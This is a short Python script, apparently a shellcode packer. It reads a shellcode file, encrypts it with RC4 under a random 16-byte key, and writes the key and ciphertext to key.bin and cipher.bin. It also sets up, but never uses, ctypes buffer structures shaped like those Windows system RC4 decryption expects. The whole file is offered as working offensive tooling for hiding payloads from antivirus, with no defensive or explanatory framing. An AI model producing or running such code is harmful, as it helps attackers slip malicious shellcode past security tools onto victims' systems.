# Import required libraries
import sys
import ctypes
import os

# Define a ctypes structure for holding the cryptographic information
class Crypt(ctypes.Structure):
    _fields_ = [
        ("Length", ctypes.c_uint32),
        ("MaximumLength", ctypes.c_uint32),
        ("Buffer", ctypes.c_void_p),
    ]

# Define the RC4 encryption function
def rc4_encrypt(data, key):
    x = 0
    box = list(range(256))
    for i in range(256):
        x = (x + box[i] + key[i % len(key)]) % 256
        box[i], box[x] = box[x], box[i]
    x = y = 0
    out = bytearray()
    for byte in data:
        x = (x + 1) % 256
        y = (y + box[x]) % 256
        box[x], box[y] = box[y], box[x]
        out.append(byte ^ box[(box[x] + box[y]) % 256])
    return out

# Check for correct command-line arguments
if len(sys.argv) != 2:
    print("Usage: python script.py <shellcode_file>")
    sys.exit(1)

# Read the shellcode file from command-line argument
shellcode_file = sys.argv[1]

with open(shellcode_file, "rb") as f:
    shellcode = f.read()

# Generate a 16-byte random key
key_buf = [os.urandom(1)[0] for _ in range(16)]
shellcode_len = len(shellcode)

# Initialize Crypt structure for shellcode and key
mem = Crypt()
mem.Buffer = ctypes.cast(ctypes.create_string_buffer(shellcode), ctypes.c_void_p)
mem.Length = mem.MaximumLength = shellcode_len

key = Crypt()
key.Buffer = ctypes.cast(ctypes.create_string_buffer(bytes(key_buf)), ctypes.c_void_p)
key.Length = key.MaximumLength = 16

# Encrypt the shellcode using the RC4 algorithm
encrypted_shellcode = rc4_encrypt(shellcode, key_buf)

# Write the key to a binary file
with open('key.bin', 'wb') as f:
    f.write(bytes(key_buf))

# Write the encrypted shellcode to a binary file
with open('cipher.bin', 'wb') as f:
    f.write(encrypted_shellcode)

